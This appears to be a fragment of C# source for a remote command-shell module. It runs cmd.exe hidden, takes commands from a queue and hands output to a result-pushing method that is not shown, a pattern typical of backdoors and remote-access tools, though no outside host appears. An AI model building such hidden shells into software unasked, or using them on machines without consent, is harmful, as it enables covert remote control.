    static Queue<string> CmdQueue = new Queue<string>();
        static Thread ThreadCMD = new Thread(new ThreadStart(CMDThread));
        private static void CMDThread()
        {
            bool Active = true;         // used to indicate the status of the session 
            
            ProcessStartInfo psiOpt = new ProcessStartInfo();
            
            psiOpt.FileName = "cmd.exe";
            psiOpt.WindowStyle = ProcessWindowStyle.Hidden;
            psiOpt.RedirectStandardOutput = true;
            psiOpt.RedirectStandardInput = true;
            psiOpt.RedirectStandardError = true;
            psiOpt.UseShellExecute = false;
            psiOpt.CreateNoWindow = true;
            
            Process procCommand = Process.Start(psiOpt);
            procCommand.OutputDataReceived += ProcCommand_OutputDataReceived;
            procCommand.ErrorDataReceived += ProcCommand_ErrorDataReceived;
            procCommand.BeginOutputReadLine();
            procCommand.BeginErrorReadLine();
            
            
            using (StreamWriter sw = procCommand.StandardInput)
            {
                while (Active)
                {
                    while (CmdQueue.Count==0) { }
                    string cmd = CmdQueue.Dequeue();
                    if (cmd != "cmdexit")
                    {                        
                        sw.WriteLine(cmd);                        
                    }
                    else
                    {
                        Active = false;
                    }
                }
            }
            procCommand.OutputDataReceived -= ProcCommand_OutputDataReceived;
            procCommand.ErrorDataReceived -= ProcCommand_ErrorDataReceived;
            procCommand.Close();
        }
        private static void ProcCommand_ErrorDataReceived(object sender, DataReceivedEventArgs e)
        {
            PushCMDResult(Encoding.ASCII.GetBytes(e.Data));
        }
        private static void ProcCommand_OutputDataReceived(object sender, DataReceivedEventArgs e)
        {
            PushCMDResult(Encoding.ASCII.GetBytes(e.Data));
        }
        public void StartCMD()
        {
            ThreadCMD.Start();
        }
       
        public void Execute(string cmd)
        {
            CmdQueue.Enqueue(cmd);
        }
